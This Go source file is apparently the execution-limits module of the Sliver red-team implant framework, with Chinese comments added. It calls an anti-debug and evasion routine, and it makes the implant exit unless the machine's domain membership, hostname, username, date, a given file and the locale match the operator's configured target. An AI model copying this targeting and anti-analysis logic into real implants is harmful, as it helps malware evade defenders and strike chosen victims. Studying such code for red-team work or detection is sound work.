package limits

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"os"

	// {{if .Config.LimitUsername}}
	"runtime"
	// {{end}}

	// {{if .Config.LimitUsername}}
	"os/user"
	// {{end}}

	// {{if .Config.LimitLocale}}
	"regexp"
	// {{end}}

	// {{if .Config.LimitDatetime}}
	"time"
	// {{end}}

	// {{if or .Config.LimitHostname .Config.LimitUsername}}
	"strings"
	// {{else}}{{end}}

	// {{if .Config.LimitLocale}}
	"github.com/bishopfox/sliver/implant/sliver/locale"
	// {{end}}
)

// ExecLimits - Checks for execution limitations (domain, hostname, etc)
func ExecLimits() {

	// {{if not .Config.Debug}}
	// Disable debugger check in debug mode, so we can attach to the process
	PlatformLimits() // Anti-debug & other platform specific evasion
	// {{end}}

	// {{if .Config.LimitDomainJoined}}
	// 判断是否在域内，不在域内则退出
	ok, err := isDomainJoined()
	if err == nil && !ok {
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.LimitHostname}}
	// 如果机器名不匹配则退出
	hostname, err := os.Hostname()
	if err == nil && strings.ToLower(hostname) != strings.ToLower("{{.Config.LimitHostname}}") {
		// {{if .Config.Debug}}
		log.Printf("%#v != %#v", strings.ToLower(hostname), strings.ToLower("{{.Config.LimitHostname}}"))
		// {{end}}
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.LimitUsername}}
	// 如果用户名不匹配则退出
	currentUser, _ := user.Current()
	if runtime.GOOS == "windows" {
		// Windows获取用户名，前面是有机器名的
		username := strings.Split(currentUser.Username, "\\")
		if len(username) == 2 && username[1] != "{{.Config.LimitUsername}}" {
			// {{if .Config.Debug}}
			log.Printf("%#v != %#v", currentUser.Name, "{{.Config.LimitUsername}}")
			// {{end}}
			os.Exit(1)
		}
	} else if currentUser.Name != "{{.Config.LimitUsername}}" {
		// {{if .Config.Debug}}
		log.Printf("%#v != %#v", currentUser.Name, "{{.Config.LimitUsername}}")
		// {{end}}
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.LimitDatetime}} "2014-11-12T11:45:26.371Z"
	// 如果超时则退出-设置Implant有效期
	expiresAt, err := time.Parse(time.RFC3339, "{{.Config.LimitDatetime}}")
	if err == nil && time.Now().After(expiresAt) {
		// {{if .Config.Debug}}
		log.Printf("Timelimit %#v expired", "{{.Config.LimitDatetime}}")
		// {{end}}
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.LimitFileExists}}
	// 如果文件不存在则退出
	if _, err := os.Stat(`{{.Config.LimitFileExists}}`); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Error statting %s: %s", `{{.Config.LimitFileExists}}`, err)
		// {{end}}
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.LimitLocale}}
	// 判断操作系统语言，匹配不到则退出
	locale := locale.GetLocale()
	match, err := regexp.MatchString(`{{.Config.LimitLocale}}`, locale)
	if !match {
		// {{if .Config.Debug}}
		if err != nil {
			log.Printf("LimitLocale regexp: %s", err)
		} else {
			log.Printf("LimitLocale regexp %#v does not match %#v", `{{.Config.LimitLocale}}`, locale)
		}
		// {{end}}
		os.Exit(1)
	}
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("Limit checks completed")
	// {{end}}

	os.Executable() // To avoid any "os unused" errors
}
